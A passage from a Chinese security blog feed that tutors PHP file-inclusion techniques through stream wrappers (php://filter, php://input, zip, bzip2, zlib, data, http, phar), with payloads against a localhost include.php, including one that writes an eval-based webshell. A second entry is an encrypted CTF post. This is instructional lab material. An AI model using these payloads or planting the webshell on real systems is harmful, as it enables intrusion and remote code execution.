对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ul><li><strong>示例</strong>：</li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navy0x05-phar-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-phar-协议font"></a> <font color="navy"><code>0x05 phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="font-color-navy0x06-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-参考文章font"></a> <font color="navy"><code>0x06 参考文章</code></font></h3><p><a href="https://zhuanlan.zhihu.com/p/25069779" target="_blank" rel="noopener">文件包含漏洞原理分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-08-17T14:27:59.670Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="692903eb44847d6e7ca78b57bc76c46b1bb17cf17332e58bde7c47c7b09844a9">85622e100507fc49db72026265d5d53bba5b2917323392df3e25f34662e8ec7b810c8d44d76d40e16fbdbd3bceafce506ee0f71bb2bbfdd1eaf450ee0a105c6deea4c486e92e0c4bac943e67823a234b9114b182c464fdd47323f84306375f42daed9b2e52003f78f4d2b970db66844e544c36dce4bcf0d2a388323b857a2371265c6129844bee07e33bcefbe1ff53f7f33fb21367df64cca786878fda574703b61e845f6dfad91888afd636f94228407963269ebcd8e1b59a8fb5247718fb9e1b8bdbfafaa2e43a7ee57b6e2276f5a4fd88dcea6162b990583ef510c557ff342f876ada61e80d9832ae7dbd92b87be5830e5f3c0f20d92725465b5e2cddefbfb7921b2b81abd24c28f651e0b6c6ce4487270eba8570a56f6e97c3c92d099239d24c0d6748d6004ccb97aed007f93dee4ec2660f7213aafae8e6d5ed54867d4e49ee74515e4afb57ed26c6076657b7dfb6dbe2e6861a2f275fe81a050439b62b974e4baa91cb6e29641e026d2ffa4ae7571943fc81f97639bb54da093cd96d23ddbc1f6e5ab74b7c5979c0f35b4645992942b104c85cb6315fe63f53bb74f793a61c0a44ffdce2297fc28df4c7e1602438090197c2f23bbae0303d631b6e24a20549a914550f3d6a7a25dea7f728e9be5eb2bcf18b66b8e95907300f3da95d667158015ef41a7513d50167542df9866ad39040bb15638feffac200a834ccc12bf414d616f8555b11307807736d54ea12b6f664462134c6ef421070f202b1dfeab1e17584b2400a842a1374f3fe6ee5fd939e0d2e33113f0a000d5bd6eb8effb49eb8951e121d08fa9cd9f2662943de2c5ddab490e5659b76d0e318a7948c37aa0c431b425a2744ed248e1a7980836d50a365fce8197b152527be0927d2c0216ef87a9500eac3ae3d1b82ca802b306441b6d89d60c199f806ef6d80d5498887bab08ba1a07a8e6e1ef66f459aee708b365d92a8c5b4dd0c0529cc760aee9dad643ab37782c0b6c32d72bf17f300442b1b3a6a292cff70711944a361b6bb9c0e7230ea58f6ae8788604ba82613a31b655a3c3fa10289840869939bade625e6b2fdad0cc3a4feaa683b66159697ac9044ea4166cdc45e4f7e329fae3c29276aaf728587c67ce1dd33be0b5465c28a00223a987b9f821c0729080f1b353b90c0b6b4c81cd4be5ed5c34b92550d5cfe852ae5d56577d095383a4aca3c8a25eeb79b2347bf0d7ac2137875de68f2a993f4db61b4116acb49d980b220f64b215bd11772e0e9977d7d90442a13cf7a035abda4550e6468a303627fc91ef209941f39603b069ff17664f4192ebfddbd8a98dcc08b6f88f132359d52519455c72cd1e7cbce04e9ebad693a0128b20a0d9cef3dd326921a7a2bc486a3b9464967c5ebcf358cd4d73e1848baa96fd2db1ae52d1c25cb6aefa4e7d6aac591097fefe57d80b7f52013053bc74ff16b9085a4c8d6bc296cbef67c053126d7309506e9858e4dd6b765db9ae6f07b145a3a1a62ee7eae28903f91309c5a05c3bb8605664e51823f72ccc5e151885c1a672b0fdc381a2d00fbd770b40950d3792be8e5241088598fcecdc555685e434eaa0ca35b25cebc8def30f64d698fe1db7dc569b9aadb3ae0be684efec7d48787c718360bea169a5254a03fca9ecd1c6eb58b3c4955f1b6c3857b8ec053de5e70385d79717e020893df47b707d3c1a70836ee0ad4a169da3b10a5439f355fa94da3a20106b8b6f68d0de47bf0b831536e60305a1e25915524bc4cae86e88222f5dd643132c9cf844d8e56b0f125f9a1d0e8f34a36dcd187b642b835311021fc011adff0f675de3cb6df7ff97c74885d7a4d799665e9c0c20dbf4788d1c0a85ae8d9fed7163975d73a8b001daa6437fe7390cb920e9f27383da666e1a62e4df1a07297d91e38e00d8bc48ee1bf36629c962d9f5af00454caccdb35a5294ff588d6f7e8112a240909b833554f62f1d5beb061af4c72378c1c83085bb2ba56f6c6998341e57cb11fb58206ec94ec4e66a66482be1860d627a2939d3cc85c169a25db004af8978e62c1700a15bdd064dbcaa5ddae769424bb61934bd19d296094873198c434fef1bb31eeeae10b548e768980fb66d2b19d93a1f3cf7058129fe80841683c0e1ff55166b4528d3ef559cf1527137eadc8820b4cf8780f04ca6b3a504e2facbf6b7bedd15b315fe54aff56bad28bda7450a2ff8b7a4bb9f55b2868eb5ba91c87f5526329a4083dd5ac151cdf17c4a8e647f06a35a7fb9c8aa97f2d8ad80e7b1a13e52359e6137546cc7e29ad50de7927e6f787938ad9f718831fd0238c53f0c93da68d05b688adcca5456a39c46448997615e0751aac6e0dab794a06bc08e6d5ecaa39635f4b2199217c9b7f4ce6bd7e1792b7462672e8449c6ccf7c4a49b46fba3826c4af66a9afb6cc93bf989fb47ee4897c11305db83c5cc4b1a0d2dca24ef1706ca21c3301b7962d6db484ae0942e7797605999a4ba87654a02f52142c05568fd6b9bd7108622dccd7bb527504970abd2fcfe16fbfc10dee037f94c3d5a9ad2d78b55774b2b37b2a9d3308ce8f5911e2b1ca2de3d453ca346afc53e9d053fd3cd49ff88d6026877aadd8acf349b0a648533958e7a8b4519662fe2cd0aca2a4bfe9afa2a47d2b20cb38798a5e136c7bef7a2567f32acabe43c3151169db63debbdde957009a91189a91f04a353384ade5ffd4591b347be2b9aed4a55a2baa2a2469ad9d1227d37071a5b0929d170672b7d2b0a33d81a1d69eca47f9bf1b60634cecd8bae555a0e307f0c0fa3fe248299a4d7348a1c0cb0ab438371d99d7f25252e7fe864583321f101b108b798271b82c0f211fd38615d6ee0bb200ae7a90aab6969b958be75773e1f128329d5309815deb5b46bf8d8323c47a026cbe7f6f4b580f6a0ce10ae14d89d353f0b5eb89deffa46a0ed6ba6ccee7a9f823d18211851a64515a18b11a97d1406a5cbd8950f0bf2794c13ec5397e8b09ebd758a10360cbaa1d68b589adbc753b6800b2f40c645de3c38286b9db343af40cbcb57cecc0574dad92225e92bd23311ff7e61bd53dce75f4cd4850b0f7c8a91f22f446ae7f83d1a51c2dcdb059093c6011516f8039d550b8a4ac107ebcb94150f01345d7f63fa58e3fd92d8efa4d517e299e55d8971bc1f10673fac715fbbc871d393a3eb3ea2fdb91bfcf05589e17be627e6bafef31172131e7d13296dc1e794be590df0df5db098605f24bff313f7cb0d95220983cf111d665bad569309ccee686e9dcfe8e1706e4f30e6703762017689dd65661a1f19cab32159a8605a4fa6f0dd1f4b6cd3c5581411511e3aadadde42044e3e854b3885d64379ce393d780518a9e0d8469c209c07c07d01466193c6363214e997de4764e2fbb665f7a57406e0535752a84f4e15db8a968ef0a71f6c138cdc09c36ab4881cc91c2f505b676d02ba3cbf7604ff8476ab7364994546739717e85d92472b39402eac9106853eef9f12a72b921764632a874b5a3091a8c014a491116910ab652a3608d288beffd52e1649a285fbe8d91f086e7d8263dc18d8905cc04997dab8a2707b85073e6703943deae7f89d6b619288b6c6b76c3636295ea876b3301b9738ed2c4d882dcf99ccd42699f11e5cd6e0938d34499fc06778fdb13b86d238ed609cdf86a7772bd71c7126c1c0e76bdcc2d672fb4e8cadb4a8d7e036044b150f2bca29b3543734c6e3824ce0461c453cdbccfd8e96c857b53ac997fb86d72361827fb96d964ef8b0c0d3ed88b8927c54bde4c9de570a0aebcb1c9771a04c57a3510102d5fe27a58b4d0c57b3b25a71e424011a0f9bd37d2fda04f828540eb8feef1b9c98b01d1d1a9b69e483d1fc64163860db50f14ef87c0b59399eafc473e819f8ccb41a86c39f42f0f308f4e137b17a7cd49850b0bd1a53383a3a9af0c51567539e03641f337fffea6fe2c0d463215ffe2f767f9b50f6e75debd8df7936b4c21add28fb80065211fba07cf10bdd0b361d638b9b7f715428aa6f1ef3685dbb1cd01953dbacd54cb3fb5de7d22e60bd699e75866a00d70d61fb2811d1a6efd18ab175f2781abd0ab771d7e898a36bc79fad964bb4213946497be94f5cc4c8c854c2c4104390f3305eb222b828fdab3d0717daa65e7cbdb07831b70a080419a61a8c3271ff026be765e133c78f50bde9ee17875c7dca07e7a7fec687940ca1fd7f65d421f22a052ec02b57af4856fe800d6ab9818843506fe69eeaaf793fe15ab22ecb8dd9976c5988c7dcd4c05005800506e83359ced236683291d9d2307a0cef14cb3c1c9a103d07cd96bba83751992ff87e509616e54e85169aeeebf245ddb00ab5103e8587e3ca0f3bb2a7a6f447faa84f33209d7c9b0a491f3e25a88888085e9ef976811ac3a7ddd3d4440f801c87e3127df86659f621e159d84222bafbcae9245f66c2198a665a61fd9242556b01637db45df109337f8f15f531065a2ba52537cfbd39a44f7f222b05812bc5e607d22241d89e033cd73a0ed742de991c726686c996e6fc3728921bb42989748292cb81bd9a8b71c26165d1f1d4e5ac881f504b583a3e83f2e904489edecd811114968f87e904195508a3c52c00f8f3fd1834dc1636fa7f3322a90eeff9789f2068ac053a350eeb91f98f4a2d45c7b8be90728030c7028a3796d1367d5a369475948c9372bbba8a0c47019a51aa7dd3911d7aafc30244b975444d9813f6aaa47bafd20ba550cd7cc487afdedc8a6c00279c73d9ac62437b553bc71073f16e4507cd7e05282321c8fe47a5b48d514f82a90f4945cf448e6e31279522b0522e2905c707e67d130ceb820057e9c8878fd6f735c3e04624aa13e85ecfd93523616ad0c6975635403769ff0ccdd1f22cdf3eb90bf0e2ad501152b959375350d8ef1581b49f7a2cea5088e6cbf4918daccb5f3eba403bbaa46c0fb8dec86adf272dc817d0adabbf1bf815602fba12b2cde65b0f149212e6fddd42b1ffaa4719e312e2ed0324fa7759dc76957fae9e7bcf8c5336dcfe7f7aac5d084695662b32ecad9ccdcc26eeb808a53401ba21d7bc649dd8b0afd1bde06fa229519989b053696d597ecb539c872c161b5ca8cf7053d7664789541412b1de7bed2220f403ea17dda51da63bd70b5cd8bc37dab912f6ca7b356119582e45605db5cd5c09d070a55cb3bdd387ba3fc414c9212583f866ef17988ee994ba45a28f6e20360c437e6d79a80538130bcbc3cb08dea8c1baf31f85e233417e73c4437191ea487ff3579e51c2e7a483f553f31d54d3b2da88a326d419ae910b7981b753a861ad353e03c392d27170708a14f2e3943edf7848612ecbf4129a04bfe864160c3e8579d25061d436ab18ba26cdd5ea522700b514924697c298721f086b60b6d2aac29a07f7f2a30f094ccf83fc2d3a61716873e25d60c1789307950adf741aaa1a47c3f6972c2bd4f1d2c8eabccb8bb7102c092760eebc5009ea585985202f20ed54837832e2fb277c751cb232b1638a93214ec174136997af8e8c149fd7cb169656b80ea94c91466d6371d01f4e5455e372961d0f69ce99364595420a0881e0fc230ad42726a2c02ba85a3bc0fcbbbc8b3d46516a9957e1af5affb1e9a27a8e138c3c58360d2aab6ca53e317f3bfc154c15dbd523849f0689d97f0c44f42cb9eb4644c5feaf56e57256ec0c9c7a8f274815dcb3d9858f620e2067072e5b329463fcdee9ddc2164f8e41fe075e0faeaae931896122b128b3d765e25344bec7fbfb7674f46fdba932a6654c477769e37b6c72978ca8a99ee49f5dfb3bb83e008e26b5f7ae319429baac6564516f62305cc72d2bf35ac6b891bd80433eb6125e24e7a2678bd76bcd929818e7c047b182b70eb173d1a12eafa63c0ef1a680d4d6135324372bb5a0e7f8443edd888462d071467c42581fa5686d1925121f2b618091f6ca9d2084d1b69ae12c1631747106599f6c333bbf13fa8fdbda8d02eec055d5aba8048acc7c5ea77a2ddded4e0456360785d71791cd1a4228db3bd2bc58bfe4678799763c85a8467a6f4891c81c3e39c3eed01acbc68397bb621384b9137ac05be419dba11a085fb5a1b8487a98108db1ab8996fbbbb7007dfbed687e4af8b61f6e8fa0b7630ec7ff5e0c180ee432518e1b753994f8e0500eaa0cc2bf4ee978acafbb36a69d41e7d57d2026e110c097ebbc9c9738211d24fd20274cb599da9fd75e3c521ef78b7715e06ab74ff4ad1449cf1879d20ec3b4e066238c60e29f193078908ebf6e5b34b1654ed924b7f2551af48b294c0a4e5a331b43f08cbc63ce1ad3a61cc14134d7f49ef61c14b73a5d3a24cb3e0eaeb8ad2455e4ad244bdadc389327dba6862e8374b3d638153e8b9e72bf405b4deabab6852a75d45fbcae60af8bd6338fc7f46a667d30deaaba52605b181c57044520fbb57eb341c2072b6cb8b4089ddb15a6201472763f3ff378f284445ca45eb753a0755b8db80e5ef37453c2a58c1a9dda8bab757756746af1aef06d63fa02b0a133697f53dbaeb768edac1d4dd6625ce51ab0a9b6c163aa7cb1f2cc1b6ad62161fe34eae0792e07c864754cc98680297001a7947d58af6312aae965593a63a8f87ba2d58a1e3d557bbdccbd185b0512050483007b2b63319aeeab0118b88aa934dbf8f450ae4036d5fba9ce645f0d88a3d041902d9aa5a3033071e8a924d2cb0eff4f75ef87b1b6009d3bef529859c946af58c591708844484ea268ce514903d6b1e6c36622fb23c85e4cc08bce4b09c657a879f3024de975421dfa9f273a7690a8540bd0f2698d9a90b88aaad298ea920fbd24ec5691bc390084f4dc475e7ffbe20f1759b11241a88a6c7f0518d960c726114343b5dc190e450772afa588d84fe521b2b79d7187fcbcb6a4e24a0724e0971279f42cd5e27fa6b4593bb9cd04457e88c115f1eecdd63882f4bc46d9c763d0007fbfc890804409abfd2aadd43604618d513953af0ff906fadd47259f9e7b7bf659d7d12591084660199dd579ec3df6a110205e5cd791c5cde404c15f6a4e4000a4c9e4967f2ed2446cd228ba4835af37c23e24fa223b0f0f83fd20921a81ab3acc3f0116ba74dd2b02cc2742238788e0657bf4dae957b8821d084bcbf2ca26f57982f3cc30c28b28546c5c119bdfaa3de064ee80454ddb153a528adbeafa3b8512ecd30729187443c2db8171f8c7c394341d896378cdd8f4614c0f596348ed067166184192260c6556919e2760a9cef66de7e9e25f6ccc758ccef21d1e70bf9d6063c0fb3e8bae131cece04321aa66179975936f355174c0d00ad4fd9d78fe4ff08fa85d1d3ae839e95d916a99e8f99123e717a2f6efb671c078710f6a10eeb1d39bf78e13a30723b9cbc6c78d4f2dbc5e1d689c0bec57e2b812c205497e9801dbc884b1de1e9a96716ac1deed08b17e87f2f9990cd85d937045520882095ec2ac37baa629236708b970cf417101a7532ebe3786363409e7792dac6b033d4f81e33747c13162a23068c681bfce078d4195879597460d96dda948c089d5a11e4d2527bda37d5b945cf57c2b6468b28af2504ef7422f12470fb74b74454e5c66b0b07a91b44175660105c93c0df05a896f95863f9f3d92bdb5d9ea571890a6a1b360d7a223086e33f21c0c75738ea2b29a28d4171ce9465ec165844d93a667600e0b24c485ec8d8345ef4880abd4d0bc39e1c6e66a1d1a46d7f7db7b6bf9e2198bfd8756b6f17d6ae3eef0ef57b260369e12f5623a69ed2bacf1706a09f3dfaf1e7e7ffe752d9c2f1547337476b6881a53401a89a177d5352d5873527df0f499939454fc38771d042c22bae1b8b0da60112145538ea6a7ca5f8c6c12b1c07cca5d4751f9d2820234f042515f76e24c142b888e25f69dc566798133d05c5dad593d7ce14ce49e632b8908c3b86ab50d145bf9f17619706d3369e89af2a50bbd0de892cd788eeb85b192180565e58840fb893cd4db9dc4dccd3aafdbbc597abbb384fb9938611dbab51373b2fa5b495be68e1a1642c757c5060fe818086d6baf7b3c768d127e3c8083227152bcde2c3ed269f23493812705ae6a6b1f8837eb12e7587bfa657c53ea2285a0c459f5e224e3be1d176d53a15f36ace6cd27388672a8df35b80666a1bc8d3b95177e6ccbdf338aeea46cd963abf2f168fd76c0415e077aa8174a54e6ccbbe794a1578865fc8fffcd6a48dec25640bd220b2748e6a05b56aedf3723a50eaf4d865188d681b3d919a9a29c13f7bcff1d59984b02890c2f49546faede27b06a7afeba70db91a20405f38974edb7ca3c2f7241941926e38d3c032ca506063ec7e8f9d31007f6fd982380c71408e2653ea04f7a5af7e36e1950f798817d8cda34275a5a25a70f1b1ac2c338ad6f93c2f63c39274c4df75486b70acd3fc01d98812449e934c6e24e59e07d0f073eff046d699a0e5165fcfc6d2c16a46c3a6581181ad451ef42cb959c52e9245118c45ca6d3afd4da6aa1cf56b679f4d46d57772e2dd3e4535cb04f7e0e00673f2d0492441ec2823236660bc1ba7937c9e0ffb92306f5e3ddeff9485c9621cb5b0042d084c4e47e6b0b37d09a5c99be813814c7873933ca9929be6fb1baad488ae509487f96d03dbac25f24dd153cc10a71585653f281c3065a233978ac3f2db866cd5b13b8db3d8a560b61168ecb8fcaaf9e027f7b2cab7362184357d17cda0a5b6418758598b9f95c3873e3735bbf75c81dc40196af4fa92c78117a4d63399cc027c8f899479a93ab4f1f3288f683229afa099dcb31018e6065c8c4d62847491d633c609e2fd069410b2bfedc6bfb0a571d99b018f6035b56c739c6c0229cda4f3174dc10f7808312fed1db009be947c00cef72ba88bbc9827e358f1db4305c64c2ab368294a21bb8f5bdd875c997925cb6e48dfe27bf8c44cf8aac23eea9f8fb9ddf38d56cca711e77843d644075c8f8c57f1f2a4a544d7ef963e7e17a8aeafd775c6fe218f07f38cbc291130ee1d5d91118cae18338542eb128b945791cf04f2f8903be6948ec55f128c39296a5af36563036c68f6ba30870a8e4b73c10c7331bb8d4dd9f5308f01aa33ddcfdf2ba49ffd83fa467a7c940a21b866dd8b428c6904eef0ee55c0065381673326d6ac939a5e868c1fb5160fc9eeaf3a2b4ca328a95c1044ceb9e2a2f04a805caa9224ca3494b331dfa21ffa3a5f55efee93624a9b90654e35beb6faa23f803d01243b9fb9068bf785d83d30240d52ac414fd9ad9aa07b5649805f79988a0afcf35ce8091ec94a7effe4d276fbac23d2801e642e9335ed2b84d2883c40cead235c2dd371e3f7ae0b3ca989e2017fb7fea2ed90ecc47149b0068f00c356360874579d4d42d06017f11586f2f21c9300985f1dee5c387c0c0b39a9be795672dd1a70e55640dc1be29c4ebedfd56dacba0b63a21df80bbae7bd19835d04bf6d9470ccfb295c355df670f8d826fff49dff9d96e63b918cc826faa94da2d664dd5c743efa9c50ca9d75b5fed5fb711d2ef6f9cd713eafa0d4cad54711a0d65b0ca95dd16a870d6577742f7430e3922b5e125e7ade00e90164ec1f8645e783e5fb14cbd309852de1cadd729260f42da3f662768c51356f81bcfa5c67b188b1343e275c9e89aae17de8e2a1a83736f61c01004ee953f3af82d0f2a4c3ed0a8efaf3fd12fb0567013997e05a7e3ed1701b3c9496b64d7b720c2f2b968d21aca48d09b39efac41a8b6676b82e016540e6e5dcf98a8e1abedb98cf3848b69237503af6cb05154bedd4ee121b6701f55cc325ed33573794703d58913d48d05432167f764053f010b4ece2411965ecee024953d3d7a4772ecfcab67dac0c4f56a4681aeccf878a4b478942737d3988d7dc1f95f67f8d41a27f93032f4d58262c930e8dd9d24e8cb5c0159a563f9add806a6cd23af9226bc48ad4a07a237f89edb234d6df799eb47f46c9491bbcdbdc2c2ba4a00a377ca5f061608770c86862a65fd9261200dcc2dc846487373a443c3a216f25f06f5b89072b662db8f2cd5353653c752e15a932e894fa2811cb3cf02241173a2f051eff600fa0eef387fb01a481fc03df92d4e6eeb8d81d32271077e50f89f6ba8076e9ab1b90165af27916b06a1867c2ecbabe75523aa8f07c8ac6f9f2c09f000edcf7378a380531ac5fbd69069671bb8c88966d5a16cf5a9afd61e06df4bbdd97bcada577a309d4e27db260b1d5eefa067dca9a95be82ce4492378f729af5c32041a796336ff0a79ff6e4d10741a8151c17daecddaacb40f4478c4e1d29aefa1f0d697598fa38e4407e591e855b409b24766055ee34c56c53be20494badb1fadb14e095214caf7c84fc32378d68f0af181a2e391c7e73d1404f6661e53a1f2b2c86ec25b0c3d6b8396c79de81fcd5d46a87ad4201c3d922079d473a4803836bfa995b419c9a34423e1a53b7a5ebbdc5e22e3d1d6461eba7133c5d0f69b551bef8c303048ff08dd70f09efebae5f5f8a0fd1fbddbb8d215839c91f57c58aac3b7c873dc9122feeba28e841936928dfe9e55bfee9b7cc9fdad2a159cf0392d938d36925da7c7aa0d35e148b37e321b76bafb8431f4dead80ffde4368208001bad420e7f7b615774c6c15749295b68302fc14ac4b0dd9091c693e51e493f03291648d59e9d2dc14cd288bc0fb44040af9d61594065fe5e2bfc5d1d0983a36846c50d5ee4d1178ed5172b05743cbab24761b94a967acde580f587cf75ee9d74480dae34366681dd86147f3cfb2006aa5b458da8ff512bd8e266a8e3d1d655b9b751806792f14559388d34de5d4eb30ff3acb64417c918d2a3e65409218b55c0cc8e683734e1fbd073d2f8cec8f3749160e521c2220b28fb2caeee0435a4d6425fb236ef18994c7e291a75b7265648f4a0f7c4ae80256eb1fc16bf9385901aca495bd15d5cfbee76f8965a6c2bea84e116030708791bcf87b61a4ca5014168ae879107327da9e4e8466fd8e6aea0edf7c46c8bb20926fd546206b7ecd2a0a87d500fe448756b74fa9544158e614631549f3f9ba0aca7aeb26bbb4e51af976c39d96fa0dacd1154790c59eb939859ce14286aad8475a692ddca7c2e6d4218c3210b90dbbcd4bd9e169b7a85bb41abd0e7c0cee937cee08fc137e41d45f07909bef64ed12ecd9c9bb1f7b4d26106fb529373edc73bae38968c636e3c9312255f964c3ade78be0ce90d949f0eb99d8c39fef06e18ced6db36185eaaed0